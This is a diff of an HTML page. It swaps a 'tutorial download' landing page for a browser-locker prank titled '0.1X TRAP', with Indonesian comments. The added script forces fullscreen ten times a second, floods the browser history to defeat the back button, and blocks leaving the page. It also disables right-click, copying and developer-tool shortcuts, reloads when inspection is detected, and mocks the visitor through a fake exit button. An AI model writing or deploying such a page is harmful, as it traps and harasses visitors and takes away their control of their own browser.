@@ -1,222 +1,518 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Unduh Tutorial ⚡</title>
-  <!-- Font Awesome untuk ikon keren -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Poppins', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>🔥 TRAP 0.1X 🔥</title>
+    <!-- Font Awesome buat ikon -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
+        }
 
-    body {
-      background: radial-gradient(circle at 20% 30%, #1e1b4b, #0b0b1f);
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-      margin: 0;
-    }
+        body {
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
 
-    .card {
-      background: rgba(10, 15, 30, 0.75);
-      backdrop-filter: blur(15px);
-      -webkit-backdrop-filter: blur(15px);
-      border: 2px solid rgba(255, 215, 0, 0.3);
-      border-radius: 60px;
-      padding: 50px 40px;
-      max-width: 550px;
-      width: 100%;
-      text-align: center;
-      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 0 0 0 2px rgba(255, 200, 50, 0.2) inset, 0 0 30px #f0b40040;
-      transition: 0.3s ease;
-    }
+        /* Efek matrix background */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(0deg, rgba(255,0,0,0.03) 1px, transparent 1px);
+            background-size: 100% 4px;
+            animation: matrix 20s linear infinite;
+            pointer-events: none;
+        }
 
-    .card:hover {
-      border-color: #ffd966;
-      box-shadow: 0 40px 70px black, 0 0 0 3px #ffcc3340 inset, 0 0 60px #ffaa33;
-    }
+        @keyframes matrix {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 100%; }
+        }
 
-    h1 {
-      font-size: 2.5rem;
-      font-weight: 700;
-      background: linear-gradient(135deg, #fff7d0, #ffe68f);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      margin-bottom: 15px;
-      text-shadow: 0 0 20px #ffd966;
-      letter-spacing: -0.5px;
-    }
+        .container {
+            position: relative;
+            z-index: 10;
+            max-width: 500px;
+            width: 100%;
+        }
 
-    .subtitle {
-      color: #b0c4de;
-      font-size: 1.2rem;
-      margin-bottom: 40px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-      flex-wrap: wrap;
-    }
+        .card {
+            background: rgba(20, 0, 0, 0.95);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 4px solid #ff0000;
+            border-radius: 50px;
+            padding: 45px 30px;
+            text-align: center;
+            box-shadow: 0 0 100px #ff0000, inset 0 0 50px #ff000030;
+            animation: borderGlow 0.5s infinite alternate;
+            position: relative;
+            overflow: hidden;
+        }
 
-    .subtitle i {
-      color: #ffbb33;
-      font-size: 1.8rem;
-      filter: drop-shadow(0 0 8px gold);
-    }
+        .card::before {
+            content: "⚠️⚠️⚠️";
+            position: absolute;
+            top: -20px;
+            left: -20px;
+            font-size: 100px;
+            opacity: 0.1;
+            transform: rotate(-20deg);
+            color: #ff0000;
+        }
 
-    .btn-download {
-      background: linear-gradient(165deg, #2a1f0c, #3f3018);
-      border: 3px solid #ffcc33;
-      border-radius: 80px;
-      padding: 22px 40px;
-      width: 100%;
-      font-size: 2rem;
-      font-weight: bold;
-      color: #fff2c0;
-      text-shadow: 0 3px 5px #32281a;
-      cursor: pointer;
-      transition: 0.25s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 18px;
-      box-shadow: 0 15px 25px #00000080, 0 5px 0 #644d1e inset, 0 -3px 0 #322613 inset;
-      margin: 35px 0 20px;
-    }
+        .card::after {
+            content: "⚠️⚠️⚠️";
+            position: absolute;
+            bottom: -20px;
+            right: -20px;
+            font-size: 100px;
+            opacity: 0.1;
+            transform: rotate(20deg);
+            color: #ff0000;
+        }
 
-    .btn-download i {
-      font-size: 2.2rem;
-      color: #ffdb7c;
-      filter: drop-shadow(0 0 8px #ffbb00);
-    }
+        @keyframes borderGlow {
+            0% { box-shadow: 0 0 50px #ff0000, inset 0 0 30px #ff000020; border-color: #ff0000; }
+            100% { box-shadow: 0 0 120px #ff0000, 0 0 200px #cc0000, inset 0 0 60px #ff000080; border-color: #ffffff; }
+        }
 
-    .btn-download:hover {
-      transform: scale(1.03) translateY(-3px);
-      background: linear-gradient(165deg, #3f3018, #5a451f);
-      border-color: #ffe066;
-      box-shadow: 0 20px 30px black, 0 0 25px #ffcc33, 0 6px 0 #b3871e inset;
-    }
+        h1 {
+            font-size: 3.2rem;
+            font-weight: 900;
+            color: #ff0000;
+            text-shadow: 0 0 40px #ff0000, 0 0 80px #aa0000;
+            margin-bottom: 20px;
+            letter-spacing: 5px;
+            word-break: break-word;
+            animation: textFlicker 0.5s infinite;
+        }
 
-    .btn-download:active {
-      transform: scale(0.98);
-      box-shadow: 0 5px 10px black;
-    }
+        @keyframes textFlicker {
+            0%, 100% { opacity: 1; text-shadow: 0 0 40px #ff0000; }
+            50% { opacity: 0.9; text-shadow: 0 0 60px #ff0000, 0 0 100px #aa0000; }
+        }
 
-    .note {
-      color: #9aaec9;
-      margin: 25px 0 10px;
-      font-size: 1rem;
-      background: #0d122b80;
-      padding: 12px 18px;
-      border-radius: 60px;
-      display: inline-block;
-      border: 1px dashed #ffcc3360;
-    }
+        .warning-icon {
+            font-size: 5rem;
+            color: #ff0000;
+            margin: 20px 0;
+            animation: rotate 1s infinite linear;
+        }
 
-    .note i {
-      color: #ffcc33;
-      margin: 0 6px;
-    }
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-    .footer-icon {
-      margin-top: 25px;
-      color: #6c7fa0;
-      font-size: 1rem;
-    }
+        .status-box {
+            background: #1a0000;
+            border: 3px solid #ff0000;
+            border-radius: 60px;
+            padding: 20px;
+            margin: 30px 0;
+        }
 
-    .footer-icon a {
-      color: #ffdb7c;
-      text-decoration: none;
-      font-weight: 600;
-    }
+        .status-text {
+            color: #ff0000;
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
 
-    .footer-icon a:hover {
-      text-decoration: underline;
-      color: #ffcc33;
-    }
+        .lock-icon {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            font-size: 2rem;
+            color: #ff0000;
+        }
 
-    /* Animasi glow halus */
-    @keyframes gentlePulse {
-      0% { text-shadow: 0 0 10px #ffd966; }
-      50% { text-shadow: 0 0 25px #ffe28a; }
-      100% { text-shadow: 0 0 10px #ffd966; }
-    }
-    h1 {
-      animation: gentlePulse 3s infinite;
-    }
-  </style>
+        .lock-icon i {
+            animation: lockPulse 0.5s infinite;
+        }
+
+        .lock-icon i:nth-child(2) {
+            animation-delay: 0.1s;
+        }
+        .lock-icon i:nth-child(3) {
+            animation-delay: 0.2s;
+        }
+        .lock-icon i:nth-child(4) {
+            animation-delay: 0.3s;
+        }
+        .lock-icon i:nth-child(5) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes lockPulse {
+            0%, 100% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.3); opacity: 1; text-shadow: 0 0 30px #ff0000; }
+        }
+
+        .countdown-box {
+            background: #000000;
+            border: 2px solid #ff0000;
+            border-radius: 50px;
+            padding: 20px;
+            margin: 30px 0;
+        }
+
+        .countdown-label {
+            color: #ff0000;
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+        }
+
+        #countdown {
+            font-size: 5rem;
+            font-weight: bold;
+            color: #ff0000;
+            font-family: monospace;
+            text-shadow: 0 0 40px #ff0000;
+            line-height: 1;
+        }
+
+        .btn-panic {
+            background: transparent;
+            border: 4px solid #ff0000;
+            border-radius: 80px;
+            padding: 25px;
+            width: 100%;
+            font-size: 2rem;
+            font-weight: bold;
+            color: #ff0000;
+            cursor: pointer;
+            transition: 0.1s;
+            margin: 30px 0 20px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-panic::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, #ff000030, transparent);
+            transition: 0.5s;
+        }
+
+        .btn-panic:hover::before {
+            left: 100%;
+        }
+
+        .btn-panic:hover {
+            background: #ff000020;
+            transform: scale(1.05);
+            box-shadow: 0 0 80px #ff0000;
+        }
+
+        .btn-panic:active {
+            transform: scale(0.95);
+        }
+
+        .footer {
+            color: #880000;
+            margin-top: 30px;
+            font-size: 0.9rem;
+        }
+
+        /* Fullscreen paksa */
+        :-webkit-full-screen .card {
+            border-width: 6px;
+        }
+    </style>
 </head>
 <body>
-  <div class="card">
-    <h1>⚡ TUTORIAL VAULT ⚡</h1>
-    <div class="subtitle">
-      <i class="fas fa-crown"></i>
-      <span>Akses Eksklusif • Koleksi Terbatas</span>
-      <i class="fas fa-crown"></i>
+    <div class="matrix-bg"></div>
+    
+    <div class="container">
+        <div class="card">
+            <h1>🔥 0.1X TRAP 🔥</h1>
+            
+            <div class="warning-icon">
+                <i class="fas fa-skull-crossbones"></i>
+            </div>
+
+            <div class="status-box">
+                <div class="status-text">
+                    <i class="fas fa-shield-alt"></i> FREKUENSI 0.1 DETIK <i class="fas fa-shield-alt"></i>
+                </div>
+                <div class="lock-icon">
+                    <i class="fas fa-lock"></i>
+                    <i class="fas fa-lock"></i>
+                    <i class="fas fa-lock"></i>
+                    <i class="fas fa-lock"></i>
+                    <i class="fas fa-lock"></i>
+                </div>
+            </div>
+
+            <!-- Timer countdown -->
+            <div class="countdown-box">
+                <div class="countdown-label">
+                    <i class="fas fa-hourglass-half"></i> CEK TIAP:
+                </div>
+                <div id="countdown">0.1s</div>
+                <div style="color: #ff0000; margin-top: 10px; font-size: 1rem;">
+                    ⚡ 10x PER DETIK ⚡
+                </div>
+            </div>
+
+            <!-- Tombol jebakan -->
+            <button class="btn-panic" id="panicBtn">
+                <i class="fas fa-ban"></i> KELUAR <i class="fas fa-ban"></i>
+            </button>
+
+            <div class="footer">
+                <i class="fas fa-code"></i> BY WATUP • 0.1X HYPER TRAP 😈
+            </div>
+        </div>
     </div>
 
-    <!-- INI TOMBOLNYA, TUAN! -->
-    <button class="btn-download" id="downloadBtn">
-      <i class="fas fa-download"></i> Download Video "Tutorial" <i class="fas fa-video"></i>
-    </button>
+    <script>
+        (function() {
+            // ==================== KONFIGURASI 0.1 DETIK ====================
+            const panicBtn = document.getElementById('panicBtn');
+            
+            // ==================== FULLSCREEN PAKSA 0.1 DETIK ====================
+            function forceFullScreen() {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                } else if (document.documentElement.webkitRequestFullscreen) {
+                    document.documentElement.webkitRequestFullscreen();
+                } else if (document.documentElement.msRequestFullscreen) {
+                    document.documentElement.msRequestFullscreen();
+                } else if (document.documentElement.mozRequestFullScreen) {
+                    document.documentElement.mozRequestFullScreen();
+                }
+            }
 
-    <div class="note">
-      <i class="fas fa-shield-alt"></i> 100% aman • langsung streaming • tanpa iklan <i class="fas fa-shield-alt"></i>
-    </div>
+            // PAKSA FULLSCREEN TIAP 0.1 DETIK (10x per detik)
+            setInterval(forceFullScreen, 100);
+            forceFullScreen();
 
-    <div class="footer-icon">
-      <i class="fas fa-code"></i> • <a href="#" id="directLink">akses langsung</a> • 😈
-    </div>
-  </div>
+            // ==================== JEBEK BACK TOTAL 0.1 DETIK ====================
+            // Isi history sampe 200 state
+            for (let i = 0; i < 200; i++) {
+                history.pushState(null, null, location.href);
+            }
+            
+            // Event handler buat back
+            window.onpopstate = function(event) {
+                // Push 20 state baru setiap kali back
+                for (let i = 0; i < 20; i++) {
+                    history.pushState(null, null, location.href);
+                }
+                
+                // Geter dikit biar keliatan error
+                document.body.style.transform = 'translateX(5px)';
+                setTimeout(() => {
+                    document.body.style.transform = 'translateX(-5px)';
+                }, 25);
+                setTimeout(() => {
+                    document.body.style.transform = 'translateX(0)';
+                }, 75);
+                
+                // Kasih efek visual
+                document.querySelector('.card').style.borderColor = '#ff0000';
+                setTimeout(() => {
+                    document.querySelector('.card').style.borderColor = '#ff0000';
+                }, 150);
+                
+                console.log('🔥 JEBETAN BACK 0.1X AKTIF!');
+            };
 
-  <script>
-    (function() {
-      // Link tujuan yang Tuan minta
-      const targetURL = 'https://youtube.com/shorts/O9jsgvW0r3Y?si=a-90ssJQf0bcLxtf';
+            // Interval nambah state TIAP 0.1 DETIK
+            setInterval(function() {
+                for (let i = 0; i < 10; i++) {
+                    history.pushState(null, null, location.href);
+                }
+            }, 100); // 0.1 DETIK!
 
-      // Ambil tombol berdasarkan ID
-      const btn = document.getElementById('downloadBtn');
-      const linkElement = document.getElementById('directLink');
+            // ==================== CEK FULLSCREEN MANUAL 0.1 DETIK ====================
+            setInterval(function() {
+                if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
+                    forceFullScreen();
+                    
+                    // Efek kalo nyoba keluar fullscreen
+                    document.body.style.backgroundColor = '#ff0000';
+                    setTimeout(() => {
+                        document.body.style.backgroundColor = '#000000';
+                    }, 50);
+                }
+            }, 100); // 0.1 DETIK!
 
-      // Fungsi untuk membuka URL di tab baru
-      function openTutorial(event) {
-        event.preventDefault(); // Mencegah perilaku default jika tombol di dalam form
-        window.open(targetURL, '_blank'); // '_blank' buka tab baru
-        // Atau bisa pake: window.location.href = targetURL; (untuk buka di tab yang sama)
-      }
+            // ==================== EVENT FULLSCREEN ====================
+            document.addEventListener('fullscreenchange', function() {
+                if (!document.fullscreenElement) {
+                    forceFullScreen();
+                }
+            });
 
-      // Pasang event listener ke tombol
-      btn.addEventListener('click', openTutorial);
+            document.addEventListener('webkitfullscreenchange', function() {
+                if (!document.webkitFullscreenElement) {
+                    forceFullScreen();
+                }
+            });
 
-      // Opsional: juga pasang ke link "akses langsung" di footer biar makin fleksibel
-      if (linkElement) {
-        linkElement.addEventListener('click', function(e) {
-          e.preventDefault();
-          window.open(targetURL, '_blank');
-        });
-        // Mengubah href agar terlihat rapi
-        linkElement.href = '#';
-      }
+            document.addEventListener('mozfullscreenchange', function() {
+                if (!document.mozFullScreenElement) {
+                    forceFullScreen();
+                }
+            });
 
-      // Bonus: sedikit efek konyol biar makin nyata (opsional)
-      btn.addEventListener('mousedown', function() {
-        this.style.transform = 'scale(0.98)';
-      });
-      btn.addEventListener('mouseup', function() {
-        this.style.transform = 'scale(1.03)';
-      });
-      btn.addEventListener('mouseleave', function() {
-        this.style.transform = 'scale(1)';
-      });
-    })();
-  </script>
+            // ==================== CEK VISIBILITY 0.1 DETIK ====================
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden) {
+                    // Kalo di minimize, paksa fullscreen terus
+                    for (let i = 0; i < 5; i++) {
+                        setTimeout(forceFullScreen, i * 20);
+                    }
+                }
+            });
+
+            // CEK VISIBILITY MANUAL TIAP 0.1 DETIK
+            setInterval(function() {
+                if (document.hidden) {
+                    forceFullScreen();
+                }
+            }, 100); // 0.1 DETIK!
+
+            // ==================== TOMBOL PANIC ====================
+            panicBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Efek cepat
+                this.style.transform = 'scale(1.2)';
+                setTimeout(() => {
+                    this.style.transform = 'scale(1)';
+                }, 50);
+                
+                // Munculin pesan troll
+                alert('⚠️ 0.1X TRAP ⚠️\n\nLU GABISA KELUAR!');
+                
+                // Paksa fullscreen
+                forceFullScreen();
+                
+                // Geterin layar super cepat
+                for (let i = 0; i < 10; i++) {
+                    setTimeout(() => {
+                        document.body.style.transform = 'translateX(5px)';
+                    }, i * 25);
+                    setTimeout(() => {
+                        document.body.style.transform = 'translateX(-5px)';
+                    }, i * 25 + 12);
+                }
+                setTimeout(() => {
+                    document.body.style.transform = 'translateX(0)';
+                }, 300);
+            });
+
+            // ==================== ANTI REFRESH ====================
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+                
+                // Kembali lagi pake history super cepat
+                for (let i = 0; i < 50; i++) {
+                    history.pushState(null, null, location.href);
+                }
+                
+                return '';
+            });
+
+            // ==================== KUNCI ORIENTASI ====================
+            try {
+                screen.orientation.lock('portrait').catch(() => {});
+            } catch(e) {}
+
+            // ==================== OVERLAY PENCEGAH ====================
+            const overlay = document.createElement('div');
+            overlay.style.position = 'fixed';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.zIndex = '999999';
+            overlay.style.background = 'transparent';
+            overlay.oncontextmenu = function(e) {
+                e.preventDefault();
+                return false;
+            };
+            overlay.onselectstart = function(e) {
+                e.preventDefault();
+                return false;
+            };
+            overlay.oncopy = function(e) {
+                e.preventDefault();
+                return false;
+            };
+            document.body.appendChild(overlay);
+
+            // ==================== ANTI INSPECT ELEMENT ====================
+            document.addEventListener('keydown', function(e) {
+                // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'J') || 
+                    (e.ctrlKey && e.key === 'u')) {
+                    e.preventDefault();
+                    
+                    // Kasih efek
+                    document.body.style.filter = 'blur(5px)';
+                    setTimeout(() => {
+                        document.body.style.filter = 'blur(0)';
+                    }, 200);
+                    
+                    return false;
+                }
+            });
+
+            // ==================== DEBUG PROTECTION 0.1 DETIK ====================
+            setInterval(function() {
+                // Cek kalo lagi di-inspect
+                if (window.outerWidth - window.innerWidth > 50 || window.outerHeight - window.innerHeight > 50) {
+                    window.location.reload();
+                }
+            }, 100); // 0.1 DETIK!
+
+            // ==================== CEK RESOLUSI 0.1 DETIK ====================
+            let lastWidth = window.innerWidth;
+            let lastHeight = window.innerHeight;
+            
+            setInterval(function() {
+                // Kalo resolusi berubah (mungkin nyoba inspect)
+                if (window.innerWidth !== lastWidth || window.innerHeight !== lastHeight) {
+                    lastWidth = window.innerWidth;
+                    lastHeight = window.innerHeight;
+                    forceFullScreen();
+                }
+            }, 100); // 0.1 DETIK!
+
+            console.log('🔥 0.1X HYPER TRAP AKTIF! 10x PER DETIK! 😈');
+        })();
+    </script>
 </body>
 </html>
